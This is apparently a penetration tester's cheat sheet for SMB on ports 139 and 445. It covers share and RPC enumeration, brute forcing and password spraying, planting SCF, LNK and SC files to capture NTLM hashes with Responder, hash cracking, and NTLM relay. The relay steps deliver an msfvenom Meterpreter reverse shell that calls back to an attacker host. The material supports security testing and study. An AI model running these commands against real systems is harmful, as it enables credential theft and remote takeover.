---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SMB (139, 445)

## Basic Commands

### SMBMap

{% tabs %}
{% tab title="Shares & Perms" %}
```bash
smbmap -H 10.10.10.10
```
{% endtab %}

{% tab title="Dirs" %}
```bash
smbmap -H 10.10.10.10 -r share1
```
{% endtab %}

{% tab title="Download" %}
```bash
smbmap -H 10.10.10.10 --download "share1\file1"
```
{% endtab %}

{% tab title="Upload" %}
```bash
smbmap -H 10.10.10.10 --upload file1 "share1\file1"
```
{% endtab %}
{% endtabs %}

### SMBClient

{% tabs %}
{% tab title="Shares" %}
```bash
smbclient -N -L //10.10.10.10
```
{% endtab %}

{% tab title="Connect" %}
```bash
smbclient -U user //10.129.42.253/share1
```
{% endtab %}

{% tab title="Download All" %}
```bash
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```
{% endtab %}
{% endtabs %}

### RPC

{% tabs %}
{% tab title="Connect" %}
```bash
# NULL session
rpcclient -U -N "" 10.10.10.10
```
{% endtab %}

{% tab title="SysInfo" %}
```bash
srvinfo
```
{% endtab %}

{% tab title="Users" %}
```bash
enumdomusers
```
{% endtab %}

{% tab title="Groups" %}
```bash
enumalsgroups
```
{% endtab %}

{% tab title="Domains" %}
```bash
enumdomains
```
{% endtab %}

{% tab title="All" %}
```bash
netshareenumall
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Local Groups" %}
```bash
enumalsgroups builtin
```
{% endtab %}

{% tab title="Privileges" %}
```bash
enumprivs
```
{% endtab %}

{% tab title="SID" %}
```bash
lookupnames user
```
{% endtab %}

{% tab title="User Info" %}
```bash
queryuser RID
```
{% endtab %}

{% tab title="Pass Pol" %}
```bash
getusrdompwinfo 1000
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="New User" %}
```bash
# create user
createdomuser user1
# set new password
setuserinfo2 user1 24 'Pass123!'
```
{% endtab %}

{% tab title="New Share" %}
```bash
netshareadd "C:\Windows" "Windows" 10 "Share1"
```
{% endtab %}

{% tab title="Change Pass" %}
<pre class="language-bash"><code class="lang-bash">setuserinfo2 &#x3C;USER> 23 'ComplexP4ssw0rd!'
# or
<strong>chgpasswd3 &#x3C;USER> &#x3C;OLD-PASS> &#x3C;NEW-PASS>
</strong></code></pre>
{% endtab %}
{% endtabs %}

### Metasploit

{% tabs %}
{% tab title="Version" %}
```bash
$ msfconsole -q
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.0.24
msf6 auxiliary(scanner/smb/smb_version) > run
```
{% endtab %}

{% tab title="Second Tab" %}

{% endtab %}
{% endtabs %}

### Operations

{% tabs %}
{% tab title="NSEs" %}
```bash
sudo nmap -sV -p 139,445 -script smb* 10.10.10.10
```
{% endtab %}

{% tab title="Mount" %}
<pre class="language-bash"><code class="lang-bash"><strong>sudo mount -t cifs //10.10.10.10/share1 /mnt
</strong></code></pre>
{% endtab %}

{% tab title="Mount (auth)" %}
{% code overflow="wrap" %}
```bash
sudo mount -t cifs -o username=<USER>,password=<PASS> //<TARGET-IP>/"<SHARE>" <PATH-TO-MOUNT>
```
{% endcode %}
{% endtab %}

{% tab title="List Dir Perms" %}
```bash
smbcacls -N '//10.10.10.10/share1' /dir1
```
{% endtab %}

{% tab title="List Perms Recur" %}
{% code overflow="wrap" %}
```bash
$ for i in $(ls); do echo $i; smbcacls -N '//10.10.10.103/share1' /dir1/$i ; done
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="1. Server" %}
```bash
impacket-smbserver -smb2support share . -username test -password tes
```
{% endtab %}

{% tab title="2. Connect" %}
```powershell
net use x: \\10.10.14.4\share /USER:test test
```
{% endtab %}

{% tab title="3. Transfer" %}
```powershell
copy file1 x:\
```
{% endtab %}
{% endtabs %}

### Other

{% tabs %}
{% tab title="Enum (1)" %}
```bash
/opt/enum4linux-ng/enum4linux-ng.py 172.16.10.3 -A
```
{% endtab %}

{% tab title="Enum (2)" %}
```bash
/opt/impacket/examples/samrdump.py 172.16.10.3
```
{% endtab %}

{% tab title="Version" %}
```bash
msf6 > useuse auxiliary/scanner/smb/smb_version
```
{% endtab %}

{% tab title="User Enum" %}
<pre class="language-bash"><code class="lang-bash"><strong>msf6 > useuse auxiliary/scanner/smb/smb_login
</strong></code></pre>
{% endtab %}
{% endtabs %}

## Attacks

### Passwords

{% tabs %}
{% tab title="Brute Force" %}
```bash
# BFA with wordlists
hydra -L <user-list> -P <pass-list> smb://<target-ip>

# BFA a target user
hydra -l <username> -P <pass-list> smb://<target-ip>
```
{% endtab %}

{% tab title="Password Spray" %}
We can password spray with `nxc`:

{% code overflow="wrap" fullWidth="true" %}
```bash
# Domain
nxc smb 172.16.10.3 -u <user-list> -p Password123! --continue-on-success

# Local
nxc smb 172.16.10.3 -u <user-list> -p Password123! --continue-on-success --local-auth
```
{% endcode %}

`hydra` defaults on attacking the domain. To force local authentication we must prepend the local machine name (e.g. `DC01`) or `.\` to the username in our userlist. For instance, `DC01\Administrator` or `.\Administrator`.

```bash
# Domain
hydra -U <user-wordlist> -p <pass> smb://<target-ip>
```
{% endtab %}
{% endtabs %}

### Hashes

All described methods (SCF, LNK, SC) require `WRITE` access to a share/directory:

* If `WRITE` access to a share is available, [NetExec](../../tools/active-directory/netexec-cme.md) modules can be used for automation.
* If `WRITE` access is only available within a `READABLE` share, the process must be done manually.

For stealing the hash, **the user must only browse the share, not interact with the file**.

{% hint style="warning" %}
Share permissions can be configured to only allow folders to be created, not files; `nxc` will flag `WRITE` access in those cases.
{% endhint %}

{% tabs %}
{% tab title="SCF" %}
{% hint style="warning" %}
Requires `WRITE` access to the `Users` share!
{% endhint %}

The **Shell Command File (SCF)** is a Windows file format used to define simple Explorer shell commands — kind of like shortcuts, but more primitive.

{% code overflow="wrap" %}
```bash
# Create the SCF file
nxc smb <target-ip> -u 'guest' -p '' -M scuffy -o NAME=README SERVER=<smb-server-ip>
```
{% endcode %}

Monitor the traffic (MSF's `auxiliary/server/capture/smb` can also be used):

{% code overflow="wrap" %}
```bash
sudo responder -I tun0
```
{% endcode %}

Clean up:

{% code overflow="wrap" %}
```bash
nxc smb <target-ip> -u 'guest' -p '' -M scuffy -o NAME=README SERVER=<smb-server-ip> CLEANUP=True
```
{% endcode %}

If a share is [locally mounted](smb-139-445.md#operations) and `WRITE` access is available for the `SMB/Users/WritableDir` folder, but not for the `Users` share, we can create an SCF file:

```bash
[Shell]
Command=2
IconFile=\\10.10.10.10\share\test.io
[Taskbar]
Command=ToggleDesktop
```

Listen:

```bash
sudo responder -I tun0
```

Transfer the SCF file to the writable directory:

```bash
sudo cp example.scf SMB/Users/WritableDir
```
{% endtab %}

{% tab title="LNK" %}
A **Link (LNK) file** is a Windows shortcut file that points to another file, folder, or program. When opened, it tells Windows to launch the target it links to — but it can also include **custom commands**, making it useful for both legitimate use and malicious purposes like executing hidden payloads.

Upload a LNK file:

{% code overflow="wrap" %}
```bash
nxc smb <target-ip> -u <user> -p <pass> -M slinky -o SERVER=<smb-server-ip> NAME=README
```
{% endcode %}

Listen (MSF's `auxiliary/server/capture/smb` can also be used):

```bash
sudo responder -I tun0
```

Clean up:

```bash
nxc smb <target-ip> -u <user> -p <pass> -M slinky -o NAME=README CLEANUP=YES
```
{% endtab %}

{% tab title="SC" %}
A **Service Configuration (SC)** **file** is a plain text file used to create or configure Windows services. It defines parameters like the service name, executable path, and startup settings. This is similar to the LNK method, but the URL needs to be escaped with `\\` and by default it writes the file `Documents` in all writable shares.

Upload a SC file:

{% code overflow="wrap" %}
```bash
nxc smb <target-ip> -u <user> -p <pass> -M drop-sc -o URL=\\\\<smb-server-ip>\\<share_name> SHARE=<share_name> FILENAME=README
```
{% endcode %}

Listen (MSF's `auxiliary/server/capture/smb` can also be used):

```bash
sudo responder -I tun0
```

Clean up:

{% code overflow="wrap" %}
```bash
nxc smb <target-ip> -u <user> -p <pass> -M drop-sc -o CLEANUP=True FILENAME=README
```
{% endcode %}
{% endtab %}

{% tab title="nltm_theft" %}
`ntml_theft` is a tool that generates 21 different types of hash theft documents, e.g. `.scf` or `.lnk` files.

{% code overflow="wrap" %}
```bash
# Create a LNK file
ntlm_theft.py -g lnk -s <attacker-ip> -f test

# Listen
sudo responder -I tun0

# Upload the file into a writable share
nxc smb <target-ip> -u <user> -p <pass> --share <share-name> --put-file test/test.lnk test.lnk
```
{% endcode %}
{% endtab %}
{% endtabs %}

Once a hash is obtained it can be cracked or relayed.

{% tabs %}
{% tab title="Crack" %}
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou
```
{% endtab %}

{% tab title="Relay" %}
See below:[#ntlm-relay](smb-139-445.md#ntlm-relay "mention")
{% endtab %}
{% endtabs %}

### NTLM Relay

{% tabs %}
{% tab title="Meterpreter" %}
Relay for gaining RCE with a Meterpreter listener:

{% code overflow="wrap" %}
```bash
# Enumerate the target hosts
nxc smb 172.16.10.0/24 --gen-relay-list relay.txt

# Create a reverse shell payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=<attacker-port> -f exe > shell.exe

# Start the SMB server
sudo impacket-ntlmrelayx -tf relay.txt -e ./shell.exe

# Start the listener
$ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <attacker-ip>; set
LPORT 4444; exploit -j"

# Migrate
meterpreter > ps
meterpreter > migrate <PID>
```
{% endcode %}
{% endtab %}

{% tab title="MSF-Based" %}
{% code overflow="wrap" %}
```bash
# Enumerate the target hosts
nxc smb 172.16.10.0/24 --gen-relay-list relay.txt

# Use the MSF module to relay
$ sudo msfconsole -q -x "use exploit/windows/smb/smb_relay; set RELAY_TARGETS 172.16.10.0/14; set SRVHOST <attacker-ip>; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <attacker-ip>; exploit -j"
```
{% endcode %}
{% endtab %}

{% tab title="Impacket" %}
```bash
# Enumerate the target hosts
nxc smb 172.16.10.0/24 --gen-relay-list relay.txt

# Relay via Impacket's script
sudo impacket-ntlmrelayx -tf relay.txt -smb2support --no-http
```
{% endtab %}
{% endtabs %}

## Resources

{% tabs %}
{% tab title="Search Connectors" %}
{% embed url="https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/" %}
{% endtab %}

{% tab title="SCF File Attacks" %}
{% embed url="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" %}
{% endtab %}
{% endtabs %}
